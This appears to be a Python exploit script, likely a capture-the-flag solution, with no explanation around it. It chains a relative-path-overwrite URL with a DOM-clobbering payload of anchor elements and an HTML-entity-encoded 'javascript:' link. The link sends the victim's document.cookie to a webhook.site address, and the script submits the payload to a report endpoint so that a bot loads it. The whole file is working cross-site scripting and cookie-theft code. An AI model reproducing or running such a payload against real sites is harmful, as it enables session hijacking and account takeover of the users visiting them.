from requests import post, get

custom_entity_names = {
    '=': 'equals',
    '+': 'plus',
    '.': 'period',
    '?': 'quest',
    '&': 'amp',
    '/': 'sol',
    "'": 'apos',
    '"': 'quot',
    '#': 'num',
    '%': 'percnt',
    ',': 'comma',
    ';': 'semi',
    '(': 'lpar',
    ')': 'rpar',
    '<': 'lt',
    '>': 'gt',
    '!': 'excl',
    '*': 'ast',
    '@': 'commat',
    '[': 'lbrack',
    ']': 'rbrack',
    '{': 'lbrace',
    '}': 'rbrace',
    '\\': 'bsol',
    '^': 'Hat',
    '`': 'grave',
    '~': 'tilde',
    '|': 'verbar',
}

entity_map = {k: f"&{v};" for k, v in custom_entity_names.items()}

def custom_html_entity_encode(text: str) -> str:
    encoded = ""
    for char in text:
        if entity_map.get(char):
            encoded += entity_map[char]
        else:
            encoded += f"&#{ord(char)};"
    return encoded

def encode_all_chars_to_url(text: str) -> str:
    return ''.join(f"%{ord(c):02X}" for c in text)

server_ip = '192.168.219.107'
server_port = '4444'
server_url = f'http://{server_ip}:{server_port}'
webhook_url = 'https://webhook.site/3522a249-b3e6-402b-8790-682dff21b496'

def gen_payload() -> str:

    rpo_exploit = f"/viewer.php/..%2fviewer.php?title=dummy&by=dummy&submit=submimt&contents="

    script = f"javascript:window.location.href='{webhook_url}?cookie='+document.cookie"
    print(f'[DEBUG] {script}')
    
    encoded_text = custom_html_entity_encode(script)

    final_payload = f'<a href="a" id=browser>a</a> <a href="Trident" id=browser name=useragent>a</a> <a href="{encoded_text}" id=browser name=ChromeDownloadURL>a</a>'
    print(f'[DEBUG] {final_payload}')

    return rpo_exploit + encode_all_chars_to_url(final_payload)

def send_report():
    
    pay = gen_payload()
    
    print('Payload : ', pay)
    
    r = get(server_url + "/report", params={
        'report':pay
    })
    
    print(r.text)
    
send_report()